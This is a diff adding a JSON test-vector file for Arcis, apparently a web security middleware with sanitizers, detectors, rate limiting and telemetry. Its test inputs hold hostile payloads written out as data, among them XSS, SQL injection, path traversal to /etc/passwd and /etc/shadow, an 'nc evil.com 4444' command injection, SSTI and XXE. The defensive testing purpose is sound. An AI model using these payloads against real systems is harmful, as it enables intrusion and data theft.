@@ -1,0 +1,1063 @@
+{
+  "version": "1.0",
+  "description": "Test vectors for Arcis implementations. All implementations must pass these tests.",
+  "sanitize_string": {
+    "xss": [
+      {
+        "input": "<script>alert('xss')</script>",
+        "expected_behavior": "must not contain '<script>'",
+        "expected_contains": "&lt;"
+      },
+      {
+        "input": "<img onerror=\"alert(1)\" src=\"x\">",
+        "expected_behavior": "must not contain 'onerror'"
+      },
+      {
+        "input": "javascript:alert(1)",
+        "expected_behavior": "must not contain 'javascript:' (case insensitive)"
+      },
+      {
+        "input": "<iframe src=\"evil.com\">",
+        "expected_behavior": "must not contain '<iframe'"
+      },
+      {
+        "input": "Hello <b>World</b>",
+        "expected_behavior": "must encode < and > as &lt; and &gt;"
+      },
+      {
+        "input": "data:text/html,<script>alert(1)</script>",
+        "expected_behavior": "must not contain 'data:'"
+      }
+    ],
+    "sql": [
+      {
+        "input": "'; DROP TABLE users; --",
+        "expected_behavior": "must not contain 'DROP' (case insensitive)"
+      },
+      {
+        "input": "1 OR 1=1",
+        "expected_behavior": "must not contain 'OR 1' pattern"
+      },
+      {
+        "input": "1 UNION SELECT password FROM users",
+        "expected_behavior": "must not contain 'UNION SELECT' (case insensitive)"
+      },
+      {
+        "input": "'; DROP TABLE accounts",
+        "expected_behavior": "must not contain 'DROP TABLE' (case insensitive)"
+      },
+      {
+        "input": "admin'--",
+        "expected_behavior": "must not contain '--'"
+      },
+      {
+        "input": "1 /* comment */ UNION SELECT",
+        "expected_behavior": "must not contain 'UNION' or '/*'"
+      }
+    ],
+    "path_traversal": [
+      {
+        "input": "../../etc/passwd",
+        "expected_behavior": "must not contain '../'"
+      },
+      {
+        "input": "..\\..\\windows\\system32",
+        "expected_behavior": "must not contain '..\\'"
+      },
+      {
+        "input": "%2e%2e%2f%2e%2e%2f",
+        "expected_behavior": "must not contain '%2e%2e' (case insensitive)"
+      },
+      {
+        "input": "file.txt",
+        "expected_output": "file.txt",
+        "comment": "Safe input should pass through unchanged"
+      }
+    ],
+    "nfkc_bypass": [
+      {
+        "input": "＜script＞alert(1)＜/script＞",
+        "expected_behavior": "fullwidth <script> normalized via NFKC then stripped (improvements.md §1.1.a)"
+      },
+      {
+        "input": "javaｓcript：alert(1)",
+        "expected_behavior": "fullwidth lowercase s + colon in javascript: normalized via NFKC then stripped"
+      },
+      {
+        "input": "．．／etc／passwd",
+        "expected_behavior": "fullwidth ../ in path normalized via NFKC then stripped"
+      },
+      {
+        "input": "＜iframe src=\"evil.com\"＞",
+        "expected_behavior": "fullwidth <iframe> normalized via NFKC then stripped"
+      }
+    ],
+    "encoding_chain_bypass": [
+      {
+        "input": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "expected_behavior": "URL-encoded <script> decoded via multi-decode chain then stripped (improvements.md §1.1.b)"
+      },
+      {
+        "input": "%253Cscript%253Ealert(1)%253C/script%253E",
+        "expected_behavior": "double-URL-encoded <script> decoded then stripped"
+      },
+      {
+        "input": "%2526%2523x3c%253bscript%2526%2523x3e%253b",
+        "expected_behavior": "triple-encoded (URL+URL+HTML) <script> opener decoded then stripped"
+      },
+      {
+        "input": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+        "expected_behavior": "HTML hex-entity <script> decoded then stripped"
+      },
+      {
+        "input": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "expected_behavior": "HTML named-entity <script> decoded then stripped"
+      },
+      {
+        "input": "John%20Doe",
+        "expected_behavior": "safe URL-encoded text decodes to plain text, passes through"
+      }
+    ]
+  },
+  "sanitize_object": {
+    "prototype_pollution": [
+      {
+        "input": {
+          "__proto__": {
+            "admin": true
+          },
+          "name": "test"
+        },
+        "expected_behavior": "result must not have '__proto__' key",
+        "expected_has_key": "name"
+      },
+      {
+        "input": {
+          "constructor": {
+            "prototype": {}
+          },
+          "email": "test@test.com"
+        },
+        "expected_behavior": "result must not have 'constructor' key",
+        "expected_has_key": "email"
+      },
+      {
+        "input": {
+          "prototype": {
+            "isAdmin": true
+          },
+          "value": 123
+        },
+        "expected_behavior": "result must not have 'prototype' key",
+        "expected_has_key": "value"
+      }
+    ],
+    "nosql_injection": [
+      {
+        "input": {
+          "$gt": "",
+          "name": "test"
+        },
+        "expected_behavior": "result must not have '$gt' key",
+        "expected_has_key": "name"
+      },
+      {
+        "input": {
+          "$where": "function(){ return true; }",
+          "id": 1
+        },
+        "expected_behavior": "result must not have '$where' key",
+        "expected_has_key": "id"
+      },
+      {
+        "input": {
+          "$ne": null,
+          "$or": [],
+          "valid": true
+        },
+        "expected_behavior": "result must not have '$ne' or '$or' keys",
+        "expected_has_key": "valid"
+      },
+      {
+        "input": {
+          "username": {
+            "$regex": ".*"
+          },
+          "password": "test"
+        },
+        "expected_behavior": "nested objects with $ keys should also be checked"
+      }
+    ],
+    "nested_objects": [
+      {
+        "input": {
+          "user": {
+            "name": "<script>xss</script>"
+          }
+        },
+        "expected_behavior": "nested string values must be sanitized"
+      },
+      {
+        "input": {
+          "items": [
+            "<script>alert(1)</script>",
+            "normal"
+          ]
+        },
+        "expected_behavior": "array items must be sanitized"
+      }
+    ]
+  },
+  "rate_limiter": {
+    "scenarios": [
+      {
+        "name": "allow_under_limit",
+        "config": {
+          "max": 5,
+          "windowMs": 60000
+        },
+        "requests": 3,
+        "same_ip": true,
+        "expected_status": 200,
+        "expected_header": "X-RateLimit-Remaining"
+      },
+      {
+        "name": "block_over_limit",
+        "config": {
+          "max": 3,
+          "windowMs": 60000
+        },
+        "requests": 5,
+        "same_ip": true,
+        "expected_status_after_limit": 429,
+        "expected_error_key": "error"
+      },
+      {
+        "name": "different_ips_separate_limits",
+        "config": {
+          "max": 2,
+          "windowMs": 60000
+        },
+        "requests_per_ip": 2,
+        "num_ips": 3,
+        "expected_all_pass": true
+      }
+    ],
+    "required_headers": [
+      "X-RateLimit-Limit",
+      "X-RateLimit-Remaining",
+      "X-RateLimit-Reset"
+    ]
+  },
+  "security_headers": {
+    "required_headers_default": {
+      "Content-Security-Policy": "must be set",
+      "X-XSS-Protection": "0",
+      "X-Content-Type-Options": "nosniff",
+      "X-Frame-Options": "DENY",
+      "Strict-Transport-Security": "must contain 'max-age='",
+      "Referrer-Policy": "strict-origin-when-cross-origin",
+      "Permissions-Policy": "must be set"
+    },
+    "removed_headers": [
+      "X-Powered-By"
+    ]
+  },
+  "validator": {
+    "required_field": [
+      {
+        "schema": {
+          "email": {
+            "type": "email",
+            "required": true
+          }
+        },
+        "input": {},
+        "expected_status": 400,
+        "expected_error_contains": "email is required"
+      }
+    ],
+    "email_validation": [
+      {
+        "schema": {
+          "email": {
+            "type": "email",
+            "required": true
+          }
+        },
+        "input": {
+          "email": "invalid"
+        },
+        "expected_status": 400,
+        "expected_error_contains": "valid email"
+      },
+      {
+        "schema": {
+          "email": {
+            "type": "email",
+            "required": true
+          }
+        },
+        "input": {
+          "email": "test@example.com"
+        },
+        "expected_status": 200
+      }
+    ],
+    "string_length": [
+      {
+        "schema": {
+          "name": {
+            "type": "string",
+            "min": 3,
+            "max": 10
+          }
+        },
+        "input": {
+          "name": "ab"
+        },
+        "expected_status": 400,
+        "expected_error_contains": "at least 3"
+      },
+      {
+        "schema": {
+          "name": {
+            "type": "string",
+            "min": 3,
+            "max": 10
+          }
+        },
+        "input": {
+          "name": "this is way too long"
+        },
+        "expected_status": 400,
+        "expected_error_contains": "at most 10"
+      }
+    ],
+    "number_range": [
+      {
+        "schema": {
+          "age": {
+            "type": "number",
+            "min": 0,
+            "max": 150
+          }
+        },
+        "input": {
+          "age": -5
+        },
+        "expected_status": 400,
+        "expected_error_contains": "at least 0"
+      },
+      {
+        "schema": {
+          "age": {
+            "type": "number",
+            "min": 0,
+            "max": 150
+          }
+        },
+        "input": {
+          "age": 200
+        },
+        "expected_status": 400,
+        "expected_error_contains": "at most 150"
+      }
+    ],
+    "enum_validation": [
+      {
+        "schema": {
+          "role": {
+            "type": "string",
+            "enum": [
+              "user",
+              "admin"
+            ]
+          }
+        },
+        "input": {
+          "role": "superadmin"
+        },
+        "expected_status": 400,
+        "expected_error_contains": "one of"
+      }
+    ],
+    "mass_assignment_prevention": [
+      {
+        "schema": {
+          "email": {
+            "type": "email",
+            "required": true
+          }
+        },
+        "input": {
+          "email": "test@test.com",
+          "isAdmin": true,
+          "role": "admin"
+        },
+        "expected_status": 200,
+        "expected_output_keys": [
+          "email"
+        ],
+        "expected_missing_keys": [
+          "isAdmin",
+          "role"
+        ]
+      }
+    ]
+  },
+  "safe_logger": {
+    "redaction": [
+      {
+        "input_data": {
+          "email": "test@test.com",
+          "password": "secret123"
+        },
+        "expected_redacted_keys": [
+          "password"
+        ],
+        "expected_visible_keys": [
+          "email"
+        ]
+      },
+      {
+        "input_data": {
+          "user": "john",
+          "token": "abc123",
+          "apiKey": "key123"
+        },
+        "expected_redacted_keys": [
+          "token",
+          "apiKey"
+        ],
+        "expected_visible_keys": [
+          "user"
+        ]
+      }
+    ],
+    "log_injection_prevention": [
+      {
+        "input_message": "User: attacker\nAdmin logged in: true",
+        "expected_behavior": "must not contain newline character in output"
+      },
+      {
+        "input_message": "Normal log\r\nFake entry",
+        "expected_behavior": "must not contain carriage return or newline"
+      }
+    ],
+    "truncation": [
+      {
+        "config": {
+          "maxLength": 50
+        },
+        "input_message": "a]repeated 100 times",
+        "expected_behavior": "output length must be less than 100",
+        "expected_contains": "[TRUNCATED]"
+      }
+    ]
+  },
+  "context_encoding": {
+    "encode_for_html": [
+      {
+        "input": "<script>alert('xss')</script>",
+        "expected": "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
+      },
+      {
+        "input": "Hello & goodbye",
+        "expected": "Hello &amp; goodbye"
+      },
+      {
+        "input": "\"quotes\" & <tags>",
+        "expected": "&quot;quotes&quot; &amp; &lt;tags&gt;"
+      },
+      {
+        "input": "safe text 123",
+        "expected": "safe text 123",
+        "comment": "Alphanumeric + spaces pass through"
+      },
+      {
+        "input": "",
+        "expected": "",
+        "comment": "Empty string returns empty"
+      }
+    ],
+    "encode_for_attribute": [
+      {
+        "input": "onclick=alert(1)",
+        "expected_behavior": "all non-alphanumeric chars encoded as &#xHH;"
+      },
+      {
+        "input": "safe",
+        "expected": "safe",
+        "comment": "Pure alphanumeric passes through"
+      },
+      {
+        "input": "",
+        "expected": ""
+      }
+    ],
+    "encode_for_js": [
+      {
+        "input": "alert('xss')",
+        "expected_behavior": "quotes and parens encoded as \\xHH"
+      },
+      {
+        "input": "safe123",
+        "expected": "safe123",
+        "comment": "Alphanumeric passes through"
+      },
+      {
+        "input": "</script>",
+        "expected_behavior": "< > / must be hex-escaped"
+      },
+      {
+        "input": "",
+        "expected": ""
+      }
+    ],
+    "encode_for_url": [
+      {
+        "input": "hello world&foo=bar",
+        "expected": "hello%20world%26foo%3Dbar"
+      },
+      {
+        "input": "safe123",
+        "expected": "safe123",
+        "comment": "Alphanumeric passes through"
+      },
+      {
+        "input": "a/b?c=d#e",
+        "expected_behavior": "/ ? = # must be percent-encoded"
+      },
+      {
+        "input": "",
+        "expected": ""
+      }
+    ],
+    "encode_for_css": [
+      {
+        "input": "expression(alert(1))",
+        "expected_behavior": "parens and other non-alphanumeric chars hex-escaped with \\HH"
+      },
+      {
+        "input": "red",
+        "expected": "red",
+        "comment": "Safe alphanumeric passes through"
+      },
+      {
+        "input": "",
+        "expected": ""
+      }
+    ]
+  },
+  "error_handler": {
+    "production_mode": [
+      {
+        "isDev": false,
+        "error": {
+          "message": "Database connection failed",
+          "stack": "at db.connect..."
+        },
+        "expected_response_contains": "Internal Server Error",
+        "expected_response_not_contains": [
+          "stack",
+          "Database"
+        ]
+      }
+    ],
+    "development_mode": [
+      {
+        "isDev": true,
+        "error": {
+          "message": "Something broke",
+          "stack": "at function..."
+        },
+        "expected_response_contains": "Something broke"
+      }
+    ]
+  },
+  "telemetry": {
+    "description": "Round-trip tests for SDK -> POST /v1/events -> GET /v1/events. All SDKs must emit the same shape; the dashboard server must accept it and return it unchanged.",
+    "minimal_deny_event": {
+      "sdk_emits": {
+        "ts": "2026-04-23T04:12:00.000Z",
+        "ip": "185.220.101.47",
+        "method": "POST",
+        "path": "/api/login",
+        "decision": "deny",
+        "vector": "sql",
+        "rule": "sql/union-select",
+        "severity": "critical",
+        "userAgent": "sqlmap/1.8#stable",
+        "status": 403,
+        "matchedPattern": "UNION SELECT",
+        "latencyMs": 0.48
+      },
+      "expected_behavior": "Server accepts the event and returns { inserted: 1 }",
+      "expected_findings_upsert": {
+        "rule": "sql/union-select",
+        "count_delta": 1,
+        "last_seen_matches_ts": true
+      }
+    },
+    "minimal_allow_event": {
+      "sdk_emits": {
+        "ts": "2026-04-23T04:13:10.000Z",
+        "ip": "71.182.12.8",
+        "method": "GET",
+        "path": "/api/products",
+        "decision": "allow",
+        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15",
+        "status": 200,
+        "latencyMs": 0.21
+      },
+      "expected_behavior": "Server accepts event with no vector/rule/severity. No finding is upserted.",
+      "expected_findings_upsert": null
+    },
+    "challenge_event": {
+      "sdk_emits": {
+        "ts": "2026-04-23T04:14:05.000Z",
+        "ip": "103.248.114.12",
+        "method": "GET",
+        "path": "/api/search",
+        "decision": "challenge",
+        "vector": "bot",
+        "rule": "bot/scanner",
+        "severity": "medium",
+        "userAgent": "Nikto/2.5.0",
+        "status": 429,
+        "reason": "Known scanner UA",
+        "latencyMs": 0.35
+      },
+      "expected_behavior": "Server accepts challenge decision. Severity 'medium' landed. Reason preserved."
+    },
+    "batch_ingest": {
+      "sdk_emits": {
+        "events": [
+          {
+            "ip": "1.2.3.4",
+            "method": "POST",
+            "path": "/api/users",
+            "decision": "deny",
+            "vector": "xss",
+            "rule": "xss/script-tag",
+            "severity": "high",
+            "userAgent": "curl/8.4.0",
+            "status": 403,
+            "matchedPattern": "<script>",
+            "latencyMs": 0.55
+          },
+          {
+            "ip": "1.2.3.4",
+            "method": "GET",
+            "path": "/api/comments",
+            "decision": "allow",
+            "userAgent": "curl/8.4.0",
+            "status": 200,
+            "latencyMs": 0.18
+          }
+        ]
+      },
+      "expected_behavior": "Server returns { inserted: 2 }. One finding upserted (xss/script-tag). Allowed event has no finding."
+    },
+    "invalid_missing_required_field": {
+      "sdk_emits": {
+        "events": [
+          {
+            "ip": "1.2.3.4"
+          }
+        ]
+      },
+      "expected_behavior": "Server returns HTTP 400 because method, path, and decision are required."
+    },
+    "invalid_empty_batch": {
+      "sdk_emits": {
+        "events": []
+      },
+      "expected_behavior": "Server returns HTTP 400 because batch must contain 1-500 events."
+    },
+    "invalid_bad_decision_enum": {
+      "sdk_emits": {
+        "events": [
+          {
+            "ip": "1.2.3.4",
+            "method": "GET",
+            "path": "/",
+            "decision": "maybe",
+            "userAgent": "",
+            "status": 200
+          }
+        ]
+      },
+      "expected_behavior": "Server returns HTTP 400 because 'maybe' is not in the decision enum."
+    },
+    "server_generates_missing_fields": {
+      "sdk_emits": {
+        "events": [
+          {
+            "ip": "1.2.3.4",
+            "method": "GET",
+            "path": "/api/health",
+            "decision": "allow"
+          }
+        ]
+      },
+      "expected_behavior": "Server accepts event. Missing id is auto-generated. Missing ts defaults to server now(). Missing userAgent defaults to ''. Missing status defaults to 200."
+    },
+    "batch_size_limit": {
+      "sdk_emits_count": 501,
+      "expected_behavior": "Server returns HTTP 400 because batch exceeds 500-event limit. SDK must split batches >= 500 before sending."
+    },
+    "cross_sdk_parity": {
+      "description": "Given the same attack payload hitting Node, Python, and Go adapters, the TelemetryEvent emitted MUST have identical values for: decision, vector, rule, severity, matchedPattern. ts and latencyMs will differ per request and are not compared. ip, method, path are framework-provided and must be canonical (lowercase method excluded — normalize uppercase).",
+      "parity_fields": [
+        "decision",
+        "vector",
+        "rule",
+        "severity",
+        "matchedPattern"
+      ],
+      "non_parity_fields": [
+        "id",
+        "ts",
+        "latencyMs",
+        "userAgent"
+      ]
+    },
+    "middleware_emission": {
+      "description": "Cross-SDK parity vectors: given a request shape arriving at arcis() middleware, the emitted TelemetryEvent MUST match expected_event on the listed fields. Each SDK reuses these cases. Excluded from comparison: ts, latencyMs, ip, userAgent (framework- or time-derived).",
+      "compared_fields": [
+        "decision",
+        "vector",
+        "severity",
+        "status"
+      ],
+      "cases": [
+        {
+          "name": "clean_get_request",
+          "config": {
+            "rateLimit": {
+              "max": 100
+            }
+          },
+          "request": {
+            "method": "GET",
+            "path": "/ping"
+          },
+          "expected_event": {
+            "decision": "allow",
+            "status": 200
+          }
+        },
+        {
+          "name": "rate_limit_exceeded",
+          "config": {
+            "rateLimit": {
+              "max": 1,
+              "windowMs": 60000
+            }
+          },
+          "request": {
+            "method": "GET",
+            "path": "/x",
+            "repeat": 2
+          },
+          "compare_event_index": 1,
+          "expected_event": {
+            "decision": "deny",
+            "vector": "rate-limit",
+            "severity": "medium",
+            "status": 429
+          }
+        },
+        {
+          "name": "sql_injection_in_body",
+          "config": {
+            "rateLimit": false,
+            "sanitize": {
+              "mode": "reject"
+            }
+          },
+          "request": {
+            "method": "POST",
+            "path": "/login",
+            "body": {
+              "user": "admin' UNION SELECT * FROM users --"
+            }
+          },
+          "expected_event": {
+            "decision": "deny",
+            "vector": "sql",
+            "severity": "high",
+            "status": 400
+          }
+        },
+        {
+          "name": "command_injection_backticks",
+          "config": {
+            "rateLimit": false,
+            "sanitize": {
+              "mode": "reject"
+            }
+          },
+          "request": {
+            "method": "POST",
+            "path": "/run",
+            "body": {
+              "cmd": "hello `whoami` world"
+            }
+          },
+          "expected_event": {
+            "decision": "deny",
+            "vector": "command",
+            "severity": "high",
+            "status": 400
+          }
+        }
+      ]
+    }
+  },
+  "detect_parity": {
+    "description": "Cross-SDK detection-function parity. Each payload must classify under the listed vector when fed through detect_xss / detect_sql / detect_path_traversal / detect_command_injection / detect_nosql / detect_prototype_pollution / detect_ssti / detect_xxe in every SDK. Catches divergence between Node hardcoded patterns and Python's patterns.json source. Negative cases (clean inputs, sink-context strings) ensure each detector stays narrow.",
+    "xss_positive": [
+      {
+        "input": "<script>alert(1)</script>",
+        "expected": true
+      },
+      {
+        "input": "<SCRIPT>alert(1)</SCRIPT>",
+        "expected": true
+      },
+      {
+        "input": "<img src=x onerror=alert(1)>",
+        "expected": true
+      },
+      {
+        "input": "<svg onload=alert(1)>",
+        "expected": true
+      },
+      {
+        "input": "javascript:alert(1)",
+        "expected": true
+      },
+      {
+        "input": "vbscript:msgbox(1)",
+        "expected": true
+      },
+      {
+        "input": "<iframe src=evil.com></iframe>",
+        "expected": true
+      },
+      {
+        "input": "<form action=https://evil.com>",
+        "expected": true
+      },
+      {
+        "input": "<meta http-equiv=refresh content=0;url=evil>",
+        "expected": true
+      },
+      {
+        "input": "<base href=https://evil.com>",
+        "expected": true
+      },
+      {
+        "input": "<link rel=stylesheet href=evil.css>",
+        "expected": true
+      },
+      {
+        "input": "<object data=evil.swf>",
+        "expected": true
+      },
+      {
+        "input": "<embed src=evil.swf>",
+        "expected": true
+      },
+      {
+        "input": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "expected": true
+      },
+      {
+        "input": "<style>body{behavior:url(evil.htc)}</style>",
+        "expected": true
+      }
+    ],
+    "xss_negative": [
+      {
+        "input": "Hello world",
+        "expected": false
+      },
+      {
+        "input": "user@example.com",
+        "expected": false
+      },
+      {
+        "input": "metadata: useful info",
+        "expected": false
+      },
+      {
+        "input": "I love (parentheses) in text",
+        "expected": false
+      },
+      {
+        "input": "5 < 10 and 10 > 5",
+        "expected": false
+      }
+    ],
+    "sql_positive": [
+      {
+        "input": "1 OR 1=1",
+        "expected": true
+      },
+      {
+        "input": "' OR '1'='1' --",
+        "expected": true
+      },
+      {
+        "input": "1; DROP TABLE users",
+        "expected": true
+      },
+      {
+        "input": "UNION SELECT password FROM users",
+        "expected": true
+      },
+      {
+        "input": "1' AND SLEEP(5)--",
+        "expected": true
+      },
+      {
+        "input": "1; WAITFOR DELAY '0:0:5'--",
+        "expected": true
+      },
+      {
+        "input": "1 AND BENCHMARK(1000000,MD5(1))",
+        "expected": true
+      }
+    ],
+    "sql_negative": [
+      {
+        "input": "Hello world",
+        "expected": false
+      },
+      {
+        "input": "alice@example.com",
+        "expected": false
+      },
+      {
+        "input": "id=1234",
+        "expected": false
+      }
+    ],
+    "path_positive": [
+      {
+        "input": "../../etc/passwd",
+        "expected": true
+      },
+      {
+        "input": "..\\..\\windows\\system32",
+        "expected": true
+      },
+      {
+        "input": "%2e%2e/etc/passwd",
+        "expected": true
+      },
+      {
+        "input": "....//etc/passwd",
+        "expected": true
+      },
+      {
+        "input": "../../../../etc/shadow%00",
+        "expected": true
+      }
+    ],
+    "path_negative": [
+      {
+        "input": "/api/users/123",
+        "expected": false
+      },
+      {
+        "input": "Hello world",
+        "expected": false
+      },
+      {
+        "input": "ratio is 1/2",
+        "expected": false
+      }
+    ],
+    "command_positive": [
+      {
+        "input": "; ls -la",
+        "expected": true
+      },
+      {
+        "input": "$(whoami)",
+        "expected": true
+      },
+      {
+        "input": "`id`",
+        "expected": true
+      },
+      {
+        "input": "&& cat /etc/passwd",
+        "expected": true
+      },
+      {
+        "input": "| nc evil.com 4444",
+        "expected": true
+      }
+    ],
+    "command_negative": [
+      {
+        "input": "Hello world",
+        "expected": false
+      },
+      {
+        "input": "alice@example.com",
+        "expected": false
+      },
+      {
+        "input": "user 5 + 5 = 10",
+        "expected": false
+      }
+    ],
+    "ssti_positive": [
+      {
+        "input": "{{ 7 * 7 }}",
+        "expected": true
+      },
+      {
+        "input": "{{config.SECRET_KEY}}",
+        "expected": true
+      },
+      {
+        "input": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "expected": true
+      }
+    ],
+    "ssti_negative": [
+      {
+        "input": "Hello world",
+        "expected": false
+      },
+      {
+        "input": "Mass: 5 kg",
+        "expected": false
+      }
+    ],
+    "xxe_positive": [
+      {
+        "input": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
+        "expected": true
+      },
+      {
+        "input": "<!ENTITY xxe SYSTEM 'http://evil.com/'>",
+        "expected": true
+      }
+    ],
+    "xxe_negative": [
+      {
+        "input": "<note><body>Hello</body></note>",
+        "expected": false
+      }
+    ]
+  }
+}
